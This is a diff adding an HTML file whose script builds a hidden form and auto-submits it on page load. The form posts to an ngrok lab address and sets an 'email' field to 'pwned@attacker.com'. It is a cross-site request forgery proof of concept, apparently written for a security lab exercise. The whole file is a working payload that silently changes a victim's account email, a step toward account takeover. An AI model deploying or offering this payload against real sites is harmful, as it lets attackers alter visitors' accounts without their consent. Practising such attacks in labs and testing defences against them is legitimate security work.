@@ -1,0 +1,18 @@
+<html>
+  <body>
+    <script>
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://202f-156-210-216-165.ngrok-free.app/index.php'; // Your lab address
+
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'email';
+      input.value = 'pwned@attacker.com';
+
+      form.appendChild(input);
+      document.body.appendChild(form);
+      form.submit();
+    </script>
+  </body>
+</html>
